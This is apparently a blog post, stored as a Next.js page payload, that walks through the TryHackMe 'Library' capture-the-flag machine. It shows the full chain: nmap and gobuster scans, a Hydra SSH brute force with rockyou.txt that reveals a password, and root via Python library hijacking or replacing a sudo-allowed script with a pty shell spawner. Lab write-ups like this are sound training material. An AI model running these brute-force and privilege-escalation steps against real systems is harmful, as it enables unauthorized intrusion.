@@ -1,0 +1,150 @@
+1:"$Sreact.fragment"
+2:I[28393,["/_next/static/chunks/0x2ci9uuoqax9.js","/_next/static/chunks/0d3shmwh5_nmn.js","/_next/static/chunks/01-v_ud90wcfw.js"],"default"]
+3:I[22016,["/_next/static/chunks/0x2ci9uuoqax9.js","/_next/static/chunks/0d3shmwh5_nmn.js","/_next/static/chunks/01-v_ud90wcfw.js"],""]
+4:I[33341,["/_next/static/chunks/0x2ci9uuoqax9.js","/_next/static/chunks/0d3shmwh5_nmn.js","/_next/static/chunks/01-v_ud90wcfw.js"],"default"]
+9:I[97367,["/_next/static/chunks/0x2ci9uuoqax9.js","/_next/static/chunks/0d3shmwh5_nmn.js"],"OutletBoundary"]
+a:"$Sreact.suspense"
+5:T1f35,<p><strong>Library</strong> is a TryHackMe boot2root machine created for FIT and BSides Guatemala CTF.</p>
+<p>Room link: <a href="https://tryhackme.com/room/bsidesgtlibrary">https://tryhackme.com/room/bsidesgtlibrary</a></p>
+<h1>Reconnaissance</h1>
+<h2>Nmap — Port Scanning</h2>
+<pre><code class="hljs language-bash">root@mirai:~# nmap -T4 -sC -sV -p- --min-rate=1000 10.10.85.187 -Pn
+Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">'up'</span> and scan <span class="hljs-built_in">times</span> will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 15:55 HKT
+Nmap scan report <span class="hljs-keyword">for</span> 10.10.85.187
+Host is up (0.24s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
+|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
+|_  256 43:e8:24:<span class="hljs-built_in">fc</span>:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to  Blog - Library Machine
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 85.22 seconds
+</code></pre>
+<p>Two ports are open: <strong>SSH (22)</strong> and <strong>HTTP (80)</strong>. Let's start with some passive recon on the web server.</p>
+<h2>Website Enumeration</h2>
+<p>Browsing the site reveals several usernames worth noting for later use:</p>
+<ul>
+<li><code>meliodas</code></li>
+<li><code>root</code></li>
+<li><code>www-data</code></li>
+<li><code>Anonymous</code></li>
+</ul>
+<p>Since the navigation menu links aren't clickable, there are no other pages to explore. Time to scan for hidden directories.</p>
+<h2>Gobuster — Directory Enumeration</h2>
+<pre><code class="hljs language-bash">root@mirai:~# gobuster <span class="hljs-built_in">dir</span> -u 10.10.85.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html --<span class="hljs-built_in">timeout</span> 50s -t 170 -f
+===============================================================
+2022/03/08 01:36:48 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
+===============================================================
+/images/              (Status: 200) [Size: 1640]
+/icons/               (Status: 403) [Size: 292]
+/index.html           (Status: 200) [Size: 5439]
+/robots.txt           (Status: 200) [Size: 33]
+</code></pre>
+<p>Opening <code>robots.txt</code> in the browser gives an interesting hint:</p>
+<p><img src="/img/thm-library-writeup/rockyou.png" alt="robots.txt content showing &#x22;rockyou&#x22;"></p>
+<blockquote>
+<p><strong>Hint:</strong> The word "rockyou" is a strong clue — it's the name of the most well-known password wordlist (<code>rockyou.txt</code>). This suggests we should try brute-forcing something.</p>
+</blockquote>
+<p>Port 22 (SSH) is open and we have a potential username — let's try brute-forcing it with Hydra.</p>
+<h2>Hydra — SSH Brute Force</h2>
+<pre><code class="hljs language-bash">hydra -L meliodas_users -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 -t 4
+</code></pre>
+<p><img src="/img/thm-library-writeup/hydra.png" alt="Hydra successfully cracking the SSH password"></p>
+<p>Hydra successfully cracks the credentials. The password for <code>meliodas</code> is <code>iloveyou1</code>.</p>
+<h1>Initial Access — User Flag</h1>
+<p>Log in over SSH and grab the <code>user.txt</code> flag:</p>
+<p><img src="/img/thm-library-writeup/user3.png" alt="SSH login and user.txt flag"></p>
+<h1>Privilege Escalation — <code>meliodas</code> → <code>root</code></h1>
+<h2>Enumeration with <code>sudo -l</code></h2>
+<p>Running <code>sudo -l</code> reveals we can execute <code>/home/meliodas/bak.py</code> as root, even though the file is owned by <code>root</code>.</p>
+<p><img src="/img/thm-library-writeup/sudo.png" alt="sudo -l output"></p>
+<p>Let's inspect the script:</p>
+<pre><code class="hljs language-python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> zipfile
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">zipdir</span>(<span class="hljs-params">path, ziph</span>):
+    <span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(path):
+        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:
+            ziph.write(os.path.join(root, file))
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    zipf = zipfile.ZipFile(<span class="hljs-string">'/var/backups/website.zip'</span>, <span class="hljs-string">'w'</span>, zipfile.ZIP_DEFLATED)
+    zipdir(<span class="hljs-string">'/var/www/html'</span>, zipf)
+    zipf.close()
+</code></pre>
+<p>The script itself isn't vulnerable to direct code injection. However, it imports the <code>os</code> and <code>zipfile</code> modules — which opens the door to <strong>Python Library Hijacking</strong>.</p>
+<h2>Python Library Hijacking</h2>
+<p>When Python imports a module, it searches directories in a specific order, starting with the <strong>current directory</strong>. If we place a malicious file named after a module in the same directory as the script, Python will import <em>our</em> file instead of the real library.</p>
+<p>Reference: <a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">Privilege Escalation via Python Library Hijacking</a></p>
+<p><strong>Step 1:</strong> Create a fake <code>os.py</code> in the same directory as <code>bak.py</code>:</p>
+<pre><code class="hljs language-python"><span class="hljs-keyword">import</span> pty
+pty.spawn(<span class="hljs-string">'/bin/bash'</span>)
+</code></pre>
+<p><strong>Step 2:</strong> Run the script with sudo:</p>
+<pre><code class="hljs language-bash"><span class="hljs-built_in">sudo</span> /usr/bin/python3 /home/meliodas/bak.py
+</code></pre>
+<p><img src="/img/thm-library-writeup/os.png" alt="Attempting os.py hijack"></p>
+<p>The <code>os</code> module hijack didn't work in this case. Let's try the same approach with the <code>zipfile</code> module instead — and this time it succeeds!</p>
+<p><img src="/img/thm-library-writeup/root.png" alt="Root shell obtained"></p>
+<p>We're root!</p>
+<hr>
+<h1>Bonus: Easier Path to Root</h1>
+<p>Since <code>meliodas</code> has write permission in the home directory, there's an even simpler approach:</p>
+<ol>
+<li>Delete <code>bak.py</code></li>
+<li>Create a new <code>bak.py</code> with the following content:</li>
+</ol>
+<pre><code class="hljs language-python"><span class="hljs-keyword">import</span> pty
+pty.spawn(<span class="hljs-string">'/bin/bash'</span>)
+</code></pre>
+<ol start="3">
+<li>Run it with <code>sudo /usr/bin/python3 /home/meliodas/bak.py</code> and you'll drop straight into a root shell.</li>
+</ol>
+<p><img src="/img/thm-library-writeup/root2.png" alt="Root shell via replaced bak.py"></p>
+<h1>Summary</h1>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Technique</th>
+<th>Tool</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Recon</td>
+<td>Port &#x26; directory scanning</td>
+<td>Nmap, Gobuster</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>SSH brute force using <code>rockyou.txt</code> hint</td>
+<td>Hydra</td>
+</tr>
+<tr>
+<td>Privilege Escalation</td>
+<td>Python library hijacking (<code>zipfile</code>)</td>
+<td>Manual</td>
+</tr>
+<tr>
+<td>Alternate PrivEsc</td>
+<td>Replace root-owned script with spawn shell</td>
+<td>Manual</td>
+</tr>
+</tbody>
+</table>0:{"rsc":["$","$1","c",{"children":[[["$","$L2",null,{}],["$","main",null,{"className":"px-6 md:px-10 lg:px-16 pt-28 pb-24 max-w-[72rem] mx-auto","children":[["$","$L3",null,{"href":"/blog","className":"font-mono text-xs text-muted hover:text-accent transition-colors inline-flex items-center gap-1.5 mb-10 group","children":[["$","span",null,{"className":"group-hover:-translate-x-0.5 transition-transform","children":"←"}],"back to blog"]}],["$","header",null,{"className":"mb-10 pb-8 border-b border-border","children":[false,["$","h1",null,{"className":"font-display font-bold text-[1.75rem] md:text-[2rem] text-text leading-tight mb-4","children":"TryHackMe - Library CTF"}],["$","div",null,{"className":"flex flex-wrap items-center gap-4","children":[["$","span",null,{"className":"font-mono text-[11px] text-dim","children":"March 7, 2022"}],false]}]]}],["$","$L4",null,{"items":[{"level":1,"text":"Reconnaissance","id":"reconnaissance"},{"level":2,"text":"Nmap — Port Scanning","id":"nmap-port-scanning"},{"level":2,"text":"Website Enumeration","id":"website-enumeration"},{"level":2,"text":"Gobuster — Directory Enumeration","id":"gobuster-directory-enumeration"},{"level":2,"text":"Hydra — SSH Brute Force","id":"hydra-ssh-brute-force"},{"level":1,"text":"Initial Access — User Flag","id":"initial-access-user-flag"},{"level":1,"text":"Privilege Escalation — meliodas → root","id":"privilege-escalation-meliodas-root"},{"level":2,"text":"Enumeration with sudo -l","id":"enumeration-with-sudo-l"},{"level":2,"text":"Python Library Hijacking","id":"python-library-hijacking"},{"level":1,"text":"Bonus: Easier Path to Root","id":"bonus-easier-path-to-root"},{"level":1,"text":"Summary","id":"summary"}],"defaultOpen":false}],["$","article",null,{"className":"prose","dangerouslySetInnerHTML":{"__html":"$5"}}],"$L6"]}]],["$L7"],"$L8"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"6yy41LhJBaYJgdZa1b82k"}
+6:["$","div",null,{"className":"mt-14 pt-8 border-t border-border flex items-center justify-between","children":[["$","$L3",null,{"href":"/blog","className":"font-mono text-xs text-muted hover:text-accent transition-colors","children":"← all posts"}],["$","$L3",null,{"href":"/","className":"font-mono text-xs text-muted hover:text-accent transition-colors","children":"~/mirai"}]]}]
+7:["$","script","script-0",{"src":"/_next/static/chunks/01-v_ud90wcfw.js","async":true}]
+8:["$","$L9",null,{"children":["$","$a",null,{"name":"Next.MetadataOutlet","children":"$@b"}]}]
+b:null
